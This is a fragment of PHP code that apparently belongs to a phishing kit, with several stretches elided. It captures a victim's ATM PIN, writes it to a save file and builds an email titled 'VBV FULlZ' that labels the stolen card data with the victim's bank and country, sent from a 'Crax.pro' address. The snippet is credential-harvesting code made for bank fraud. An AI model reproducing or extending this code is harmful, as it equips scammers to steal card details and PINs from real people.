...
if(isset($_POST['atm_pin'])){$msg.="ATM Pin  :     : {$atm_pin}\r\n";
}
...
fclose($save);
    ...
    $subject="-".$scamname."VBV FULlZ  [".$_SESSION['_cc_bank_']."] From [".$_SESSION['ip_countryName']."]";
    $headers="From: 💸 Crax.pro 💸 <ez@crax.pro>\r\n";
